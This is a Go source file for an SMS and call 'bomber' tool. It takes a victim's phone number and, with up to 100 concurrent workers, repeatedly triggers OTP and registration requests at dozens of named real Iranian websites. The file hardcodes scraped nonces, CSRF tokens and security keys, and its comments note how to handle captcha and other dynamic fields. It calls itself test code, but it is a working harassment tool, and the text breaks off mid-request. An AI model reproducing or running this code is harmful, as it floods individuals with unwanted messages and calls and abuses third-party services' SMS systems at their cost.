// faghat teste code
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
// توابع کمکی برای فرمت کردن شماره تلفن (برای استفاده داخلی در task ها)
// چون اینها منطق ساده ای دارند و از پکیج های موجود استفاده می کنند، اضافه می شوند.
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
		                                      :-.
		                                  .:  =#-:-----:
		                                    **%@#%@@@#*+==:
		                                 :=*%@@@@@@@@@@@@@@%#*=:
		                              -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
		                            . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
		                          .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
		                        =% .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
		                       :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
		                       #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
		                      .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
		                       =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
		                       +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
		                       =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
		                       .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
		                        #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
		                        -@@@@*:       . -#@@@@@@#:  .       -#@@@%:
		                        *@@%#           -@@@@@@.            #@@@+
		                         .%@@# @monsmain +@@@@@@=  Sms Bomber #@@#
		                         :@@* =%@@@@@@%-  faster    *@@:
		                          #@@%        .*@@@@#%@@@%+.          %@@+
		                          %@@@+     -#@@@@@* :%@@@@@*-       *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
		                          *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
		                           #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
		                            =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
		                              .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
		                                   #@@@@@@@@@@@@@@@@@@@@@@+
		                                    *@@@@@@@@@@@@@@@@@@@@+
		                                     +@@%*@@%@@@%%@%*@@%=
		                                      +%+ %%.+@%:-@* *%-
		                                       .  %# .%#  %+
		                                          :.  %+  :.
		                                               -:
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // Note: Update these counts based on the final number of added services
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int

	switch strings.ToLower(speedChoice) {
	case "fast":
		numWorkers = 100
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		numWorkers = 30
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		numWorkers = 30
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	// تخمین اندازه کانال tasks: تعداد تکرار * (تعداد کل URLهای فعال)
	tasks := make(chan func(), repeatCount*40) // 40 یک تخمین اولیه است، با توجه به تعداد URLهای اضافه شده تنظیم شود

	var wg sync.WaitGroup

	// تخمین اندازه کانال ch: تعداد تکرار * (تعداد کل URLهای فعال)
	ch := make(chan int, repeatCount*40) // 40 یک تخمین اولیه است

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// --- حلقه اصلی برای اضافه کردن وظایف ---
	for i := 0; i < repeatCount; i++ {
           
                // livarfars.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("digits_process_register", "1")
			formData.Set("instance_id", "9db186c8061abadc35d6b9563c5e0f33") // این مقدار ممکن است داینامیک باشد و نیاز به بررسی دارد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//livarfars.ir/?page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2F") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "58b9067254")                                                                // این مقدار ممکن است داینامیک باشد و نیاز به بررسی دارد
			formData.Set("_wp_http_referer", "/?login=true&page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2F")       // ممکن است نیاز به URL Encode داشته باشد و داینامیک باشد
			sendFormRequest(ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// ashraafi.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "send_verification_code")
			formData.Set("phone_number", phone)
			sendFormRequest(ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// moshaveran724.ir - pms.php (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone)
			formData.Set("cache", "false")
			sendFormRequest(ctx, "https://moshaveran724.ir/m/pms.php", formData, &wg, ch)
		}

		// moshaveran724.ir - uservalidate.php (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone)
			formData.Set("cache", "false")
			sendFormRequest(ctx, "https://moshaveran724.ir/m/uservalidate.php", formData, &wg, ch)
		}

		// simkhanapi.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "key" در این درخواست وجود دارد و ممکن است داینامیک باشد.
			// اگر این key ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت key جدید در هر بار دارد.
			sendJSONRequest(ctx, "https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
				"mobileNumber": phone,
				"key":          "036040d8-452e-48f9-b544-d2ffd1442132", // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
				"ReSendSMS":    false,
			}, &wg, ch)
		}

		// pakhsh.shop - Variation 1 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("digits_reg_name", "ifiyfxgud")
			formData.Set("digits_process_register", "1")
			formData.Set("instance_id", "7b9c803771fd7a82bf8f0f5a673f1a3d") // این مقدار ممکن است داینامیک باشد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "63fd8a495f")                                                                // این مقدار ممکن است داینامیک باشد
			formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F")       // ممکن است نیاز به URL Encode داشته باشد و داینامیک باشد
			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// pakhsh.shop - Variation 2 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("digits_reg_name", "ifiyfxgud")
			formData.Set("digits_process_register", "1")
			formData.Set("sms_otp", "")
			formData.Set("otp_step_1", "1")
			formData.Set("signup_otp_mode", "1")
			formData.Set("instance_id", "7b9c803771fd7a82bf8f0f5a673f1a3d") // این مقدار ممکن است داینامیک باشد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "63fd8a495f")                                                                // این مقدار ممکن است داینامیک باشد
			formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F")       // ممکن است نیاز به URL Encode داشته باشد و داینامیک باشد
			formData.Set("container", "digits_protected")
			formData.Set("sub_action", "sms_otp")
			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// api.doctoreto.com (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: فیلد "captcha" در Payload وجود دارد، حتی اگر خالی باشد.
			// برخی سایت ها ممکن است این فیلد را بررسی کنند یا در آینده CAPTCHA واقعی اضافه کنند.
			sendJSONRequest(ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
				"mobile":     strings.TrimPrefix(phone, "0"), // این سایت ممکن است شماره را بدون صفر اول بخواهد
				"country_id": 205,
				"captcha":    "", // ممکن است در آینده نیاز به CAPTCHA واقعی پیدا کند
			}, &wg, ch)
		}

		// backend.digify.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://backend.digify.shop/user/merchant/otp/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// api.watchonline.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// offch.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("1_invite_code", "")
			formData.Set("1_username", phone) // نام فیلد شماره تلفن در اینجا 1_username است
			// formData.Set("0", `[{"message":""},"$K1"]`) // این فیلد به نظر ثابت و مرتبط با پیام است و شاید نیازی به ارسال نداشته باشد
			sendFormRequest(ctx, "https://www.offch.com/login", formData, &wg, ch)
		}

		// refahtea.ir (Form)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "security" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Nonce یا Token).
			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت security جدید در هر بار دارد.
			formData := url.Values{}
			formData.Set("action", "refah_send_code")
			formData.Set("mobile", strings.TrimPrefix(phone, "0")) // ممکن است شماره را بدون صفر اول بخواهد
			formData.Set("security", "e10382e5bd")                 // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// glite.ir (Form)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "security" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Nonce یا Token).
			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت security جدید در هر بار دارد.
			formData := url.Values{}
			formData.Set("action", "mreeir_send_sms")
			formData.Set("mobileemail", phone) // نام فیلد شماره تلفن در اینجا mobileemail است
			formData.Set("userisnotauser", "")
			formData.Set("type", "mobile")
			formData.Set("captcha", "")     // ممکن است در آینده نیاز به CAPTCHA داشته باشد
			formData.Set("captchahash", "") // ممکن است در آینده نیاز به CAPTCHA داشته باشد
			formData.Set("security", "b9de62da42") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			sendFormRequest(ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
 // melix.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://melix.shop/site/api/v1/user/validate", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		// delino.com - PreRegister (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://www.delino.com/User/PreRegister", formData, &wg, ch)
		}
		// delino.com - register (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://www.delino.com/user/register", formData, &wg, ch)
		}
		// api.timcheh.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		// beta.raghamapp.com (JSON Array Payload) - Custom
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس یک آرایه JSON شامل یک شیء ارسال می‌کند، نه فقط یک شیء JSON.
			// کد زیر برای ارسال آرایه تغییر داده شده است و فاقد منطق تلاش مجدد تابع sendJSONRequest است.
			payload := []map[string]interface{}{
				{
					"phone": "+98" + strings.TrimPrefix(phone, "0"), // نمونه شما +98 داشت
				},
			}
			jsonData, err := json.Marshal(payload)
			if err != nil {
				fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s: %v\033[0m\n", "https://beta.raghamapp.com/auth", err)
				ch <- http.StatusInternalServerError
				return
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://beta.raghamapp.com/auth", bytes.NewBuffer(jsonData))
			if err != nil {
				fmt.Printf("\033[01;31m[-] Error while creating request to %s: %v\033[0m\n", "https://beta.raghamapp.com/auth", err)
				ch <- http.StatusInternalServerError
				return
			}
			req.Header.Set("Content-Type", "application/json")

			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
					fmt.Printf("\033[01;31m[-] Network error for %s: %v. Retrying is not implemented here, skipping.\033[0m\n", "https://beta.raghamapp.com/auth", err)
					ch <- http.StatusInternalServerError
					return
				} else if ctx.Err() == context.Canceled {
					fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", "https://beta.raghamapp.com/auth")
					ch <- 0
					return
				} else {
					fmt.Printf("\033[01;31m[-] Unretryable error for %s: %v\033[0m\n", "https://beta.raghamapp.com/auth", err)
					ch <- http.StatusInternalServerError
					return
				}
			}

			ch <- resp.StatusCode
			resp.Body.Close()
			// بدون منطق Retry
		}
		// client.api.paklean.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("tel", phone)
			sendFormRequest(ctx, "https://client.api.paklean.com/download", formData, &wg, ch)
		}
		// mashinbank.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mashinbank.com/api2/users/check", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}
		// takfarsh.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "vooroodak__submit-username")
			formData.Set("username", phone)
			formData.Set("security", "6b19e18a87") // توجه: ممکن است نیاز به تولید داینامیک داشته باشد
			sendFormRequest(ctx, "https://takfarsh.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
		// dicardo.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("csrf_dicardo_name", "0f95d8a7bfbcb67fc92181dc844ab61d") // توجه: ممکن است نیاز به تولید داینامیک داشته باشد
			formData.Set("phone", phone)
			formData.Set("type", "0")
			formData.Set("codmoaref", "")
			sendFormRequest(ctx, "https://dicardo.com/sendotp", formData, &wg, ch)
		}
		// bit24.cash - Register/Send-Code (POST JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس ممکن است نیاز به اجرای یک درخواست GET قبل از این داشته باشد.
			// این درخواست فقط مرحله POST را انجام می‌دهد و ممکن است بدون مرحله GET کار نکند.
			sendJSONRequest(ctx, "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
				"country_code": "98",
				"mobile":       phone,
			}, &wg, ch)
		}
		// account.bama.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("username", phone)
			formData.Set("client_id", "popuplogin")
			sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
		}
		// lms.tamland.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
				"Mobile":       phone,
				"SchoolId":     -1,
				"consultantId": "tamland",
				"campaign":     "campaign",
				"utmMedium":    "wordpress",
				"utmSource":    "tamland",
			}, &wg, ch)
		}
		// api.zarinplus.com (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: در نمونه شما شماره تلفن با "98" شروع میشد، اینجا از ورودی کاربر (phone) استفاده شده.
			// اگر نیاز به فرمت "98912..." دارید، می‌توانید تبدیل کنید: "98" + strings.TrimPrefix(phone, "0")
			sendJSONRequest(ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
				"phone_number": phone,
				"source":       "zarinplus",
			}, &wg, ch)
		}
		// api.abantether.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		// bck.behtarino.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		// flightio.com (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس شماره تلفن را با فرمت "98-912..." می‌خواهد.
			formattedPhone := "98-" + strings.TrimPrefix(phone, "0")
			sendJSONRequest(ctx, "https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
				"userKey":     formattedPhone,
				"userKeyType": 1,
			}, &wg, ch)
		}
		// www.namava.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس شماره تلفن را با فرمت "+98912..." می‌خواهد.
			formattedPhone := "+98" + strings.TrimPrefix(phone, "0")
			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
				"UserName":     formattedPhone,
				"ReferralCode": nil,
			}, &wg, ch)
		}
		// novinbook.com (Call - Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("route", "account/phone")
			formData.Set("phone", strings.TrimPrefix(phone, "0"))
			formData.Set("call", "yes")
			sendFormRequest(ctx, "https://novinbook.com/index.php?route=account/phone", formData, &wg, ch)
		}

 // fafait.net - hasUser
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "operationName": "hasUser",
            "variables": map[string]interface{}{
                "input": map[string]string{
                    "username": phone,
                },
            },
            // extension field was in the example, but might not be strictly needed for basic request
            // "extensions": map[string]interface{}{ ... },
        }
        sendJSONRequest(ctx, "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
    }

    // fafait.net - with nickname
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            // operationName was not explicitly in the second fafait example, might be inferred or not needed
            // "operationName": "someOperation",
            "variables": map[string]interface{}{
                "input": map[string]string{
                    "mobile": phone,
                    "nickname": "TestUser", // می‌توانید این را تغییر دهید یا تصادفی کنید
                },
            },
            // extension field was in the example, but might not be strictly needed
            // "extensions": map[string]interface{}{ ... },
        }
        sendJSONRequest(ctx, "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
    }

    // tamimpishro.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
            "name": "Test Name", // می‌توانید این را تغییر دهید یا تصادفی کنید
            "national_code": "0000000000", // ممکن است این فیلد اجباری نباشد یا نیاز به مقدار معتبر داشته باشد
            "referrer": "گوگل",
            "return_url": "",
        }
        sendJSONRequest(ctx, "https://www.tamimpishro.com/site/api/v1/user/otp", payload, &wg, ch)
    }

    // gateway.telewebion.com (شامل پارامتر دینامیک g-recaptcha-response)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "code": "98",
            "phone": phone[1:], // حذف صفر اول اگر نیاز باشد، بر اساس نمونه
            "smsStatus": "default",
            // "g-recaptcha-response": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
        }
        sendJSONRequest(ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
    }

    // app.itoll.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://app.itoll.com/api/v1/auth/login", payload, &wg, ch)
    }

    // api.lendo.ir - check-password
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/check-password", payload, &wg, ch)
    }

    // api.lendo.ir - send-otp
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/send-otp", payload, &wg, ch)
    }

    // api.pinorest.com (شامل پارامتر دینامیک captcha)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
            // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
        }
        sendJSONRequest(ctx, "https://api.pinorest.com/frontend/auth/login/mobile", payload, &wg, ch)
    }

    // api.mobit.ir - login
    wg.Add(1)
    tasks <- func() {
         // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "number": phone,
        }
        sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v6/register/login", payload, &wg, ch)
    }

     // api.mobit.ir - register (شامل پارامترهای دینامیک hash_1, hash_2)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "number": phone,
             // این پارامترها دینامیک هستند و ممکن است مشکل ایجاد کنند
            // "hash_1": 1745760096, // این یک عدد است، map[string]string قبول نمیکند
            // "hash_2": "0d6f656b3e726b9180b9572bd8c670ca79c2766d6ea60ca5b2b0fe34cc41f3eb",
        }
        sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v8/register/register", payload, &wg, ch)
    }


    // api.vandar.io (ش شامل پارامتر دینامیک captcha)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
            // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
            "captcha_provider": "CLOUDFLARE", // این ممکن است ثابت باشد
        }
        sendJSONRequest(ctx, "https://api.vandar.io/account/v1/check/mobile", payload, &wg, ch)
    }

    // drdr.ir
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://drdr.ir/api/v3/auth/login/mobile/init/", payload, &wg, ch)
    }

    // azki.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "phoneNumber": phone,
            "origin": "www.azki.com",
        }
        sendJSONRequest(ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", payload, &wg, ch)
    }

    // api.epasazh.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.epasazh.com/api/v4/blind-otp", payload, &wg, ch)
    }

    // ws.alibaba.ir
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "phoneNumber": phone,
        }
        sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
    }

    // app.ezpay.ir
     wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
